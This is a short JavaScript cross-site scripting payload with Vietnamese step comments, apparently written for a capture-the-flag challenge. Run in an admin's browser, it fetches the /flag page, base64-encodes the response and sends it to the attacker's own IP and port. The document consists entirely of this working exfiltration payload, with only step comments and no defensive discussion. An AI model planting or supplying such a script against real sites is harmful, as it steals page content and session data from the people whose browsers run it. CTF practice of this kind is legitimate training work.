<script>
  // Bước 1: Ép trình duyệt của Admin gọi đến trang chứa flag
  fetch('/flag')
    .then(response => response.text()) // Đọc toàn bộ nội dung HTML/Text trả về
    .then(data => {
      // Bước 2: Mã hóa Base64 nội dung đó và gửi về máy bạn
      fetch('http://[IP_VPN_CỦA_BẠN]:[PORT]/?data=' + btoa(data));
    });
</script>
